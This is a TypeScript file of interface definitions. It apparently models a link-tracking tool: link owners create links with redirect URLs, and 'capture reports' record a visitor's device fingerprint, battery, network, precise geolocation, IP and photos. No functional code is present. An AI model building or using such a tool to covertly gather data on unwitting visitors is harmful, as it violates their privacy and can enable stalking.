
export interface DeviceInfo {
  browser: string;
  os: string;
  platform: string;
  language: string;
  screenResolution: string;
  cores: number;
  userAgent: string;
  orientation: string;
  ram: number;
  timezoneOffset: number;
  timezoneName: string;
  devicePixelRatio: number;
  colorDepth: number;
  maxTouchPoints: number;
  doNotTrack: string | null;
  pdfViewerEnabled: boolean;
}

export interface BatteryInfo {
  level: number;
  charging: boolean;
  chargingTime: number;
  dischargingTime: number;
}

export interface NetworkInfo {
  type?: string;
  effectiveType?: string;
  downlink?: number;
  rtt?: number;
  saveData?: boolean;
}

export interface GeoLocation {
  lat: number;
  lon: number;
  accuracy: number;
  altitude?: number | null;
  altitudeAccuracy?: number | null;
  heading?: number | null;
  speed?: number | null;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  ip?: string;
}

export interface OwnerInfo {
  ownerId: string;
  ip?: string;
  device?: Partial<DeviceInfo>;
  lastActive: string;
}

export interface CaptureReport {
  id: string;
  ownerId: string;
  timestamp: string;
  device: DeviceInfo;
  battery: BatteryInfo;
  network: NetworkInfo;
  location: GeoLocation;
  photos: string[];
  redirectUrl: string;
  linkId?: string;
}

export interface LinkConfig {
  id: string;
  ownerId: string;
  redirectUrl: string;
  createdAt: string;
  name: string;
}
